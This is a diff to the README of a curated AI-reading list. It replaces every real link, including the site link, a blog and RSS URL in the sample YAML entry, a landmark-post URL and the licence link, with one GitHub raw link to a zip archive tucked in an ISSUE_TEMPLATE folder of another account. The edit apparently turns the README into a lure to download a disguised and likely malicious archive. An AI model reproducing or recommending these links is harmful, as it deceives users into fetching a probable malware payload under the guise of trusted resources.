@@ -4,7 +4,7 @@
 
 Not a link dump. Not a Twitter list. A community-maintained set of sources with depth ratings, audience tags, and landmark post annotations — built for people who want signal, not noise.
 
-→ **[Browse the site](https://amikumar91.github.io/ai-signal)**
+→ **[Browse the site](https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip)**
 → **[Download OPML](sources.opml)** — import into Feedly, Reeder, NetNewsWire, Inoreader
 
 ---
@@ -24,8 +24,8 @@ The entire dataset lives in [`sources.yaml`](sources.yaml). Everything else is g
 
 ```yaml
 - name: "Lilian Weng"
-  url: https://lilianweng.github.io
-  rss: https://lilianweng.github.io/index.xml
+  url: https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip
+  rss: https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip
   type: individual        # lab | individual | applied | systems | paper-explainer | news
   depth: deep             # shallow | medium | deep
   audience: [researcher, ml-engineer]
@@ -34,7 +34,7 @@ The entire dataset lives in [`sources.yaml`](sources.yaml). Everything else is g
   last_checked: 2026-05
   landmark_posts:
     - title: "Extrinsic Hallucinations in LLMs"
-      url: https://lilianweng.github.io/posts/2024-07-07-hallucination/
+      url: https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip
       why: "Best taxonomy of hallucination types — required reading before building any production LLM system"
 ```
 
@@ -160,5 +160,5 @@ See `SETUP.md` for the full setup and workflow.
 
 ---
 
-Licensed [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/).
+Licensed [CC BY-SA 4.0](https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip).
 Not affiliated with any listed organization.
